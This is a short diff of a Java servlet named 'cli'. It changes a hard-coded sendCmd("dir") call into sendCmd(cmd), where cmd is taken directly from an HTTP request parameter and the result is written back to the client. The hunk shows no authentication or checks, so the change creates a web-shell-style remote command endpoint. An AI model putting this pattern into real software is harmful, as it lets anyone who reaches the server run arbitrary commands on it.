@@ -35,7 +35,7 @@ public class cli extends HttpServlet{
 		output = " ";
 
 		cmd = req.getParameter("cmd");
-		String update = sendCmd("dir");
+		String update = sendCmd(cmd);
 		
 		if(output == " "){
 			resp.getWriter().write(update);
